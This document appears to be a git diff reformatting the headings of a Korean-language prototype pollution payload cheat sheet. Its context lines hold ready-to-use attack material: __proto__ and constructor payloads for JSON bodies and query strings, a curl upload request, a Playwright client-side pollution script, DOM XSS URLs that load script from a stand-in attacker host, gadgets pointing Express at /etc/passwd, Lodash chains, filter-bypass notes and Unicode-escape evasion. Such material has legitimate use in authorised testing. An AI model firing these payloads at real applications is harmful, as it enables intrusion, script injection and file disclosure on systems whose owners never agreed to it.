@@ -1,13 +1,13 @@
 ### 기본 페이로드
 
-**서버 sink — JSON body:**
+#### 서버 sink — JSON body
 ```json
 {"__proto__":{"polluted":"yes"}}
 {"constructor":{"prototype":{"polluted":"yes"}}}
 {"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted2":"yes"}}}
 ```
 
-**서버 sink — Query string (qs `extended:true`):**
+#### 서버 sink — Query string (qs `extended:true`)
 ```
 ?__proto__[polluted]=yes
 ?constructor[prototype][polluted]=yes
@@ -21,7 +21,7 @@
 curl -X POST "https://target/upload" -F "__proto__[polluted]=yes" -F "file=@x.txt"
 ```
 
-**오염 확인:**
+#### 오염 확인
 ```
 # 오염 후 다른 endpoint에서 빈 객체에 polluted 속성 존재 여부
 GET /api/user/profile  → response에 "polluted":"yes" 포함 여부
@@ -39,7 +39,7 @@ GET /api/health        → 일반 endpoint 응답 변화 관찰
 | jQuery `extend` 클라이언트 | `{"__proto__":{"src":"//attacker/xss.js"}}` (CSPP) + jQuery selector 트리거 |
 | Express `res.render` 옵션 | `{"__proto__":{"layout":"/etc/passwd"}}` |
 
-**클라이언트 CSPP (URL-based, Playwright):**
+#### 클라이언트 CSPP (URL-based, Playwright)
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
@@ -59,19 +59,19 @@ const { chromium } = require('playwright');
 })();
 ```
 
-**CSPP + DOM XSS 가젯:**
+#### CSPP + DOM XSS 가젯
 ```
 https://target/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>
 https://target/page?__proto__[srcdoc]=<script>alert(1)</script>
 https://target/page?__proto__[src]=//attacker/xss.js
 ```
 
-**Class-based pollution (CVE-2022-21824, Node.js):**
+#### Class-based pollution (CVE-2022-21824, Node.js)
 ```json
 {"__proto__":{"hasOwnProperty":{"toString":"..."}}}
 ```
 
-**Lodash CVE 체인 페이로드:**
+#### Lodash CVE 체인 페이로드
 - `_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))`
 - `_.set({}, '__proto__.polluted', 'yes')`
 - `_.setWith({}, '__proto__.polluted', 'yes', Object)`
@@ -93,7 +93,7 @@ https://target/page?__proto__[src]=//attacker/xss.js
 | Lodash `_.setWith` 차단 | `_.set`, `_.merge`, `_.defaultsDeep`, `_.zipObjectDeep` 다른 함수 |
 | qs `prototypes: false` 옵션 | body parser는 별도 — Express 기본 `extended: true`는 여전 |
 
-**Encoding 우회:**
+#### Encoding 우회
 ```
 # Unicode escape (JSON 파서 디코딩 후 통과)
 {"\u005f\u005fproto\u005f\u005f":{"polluted":"yes"}}
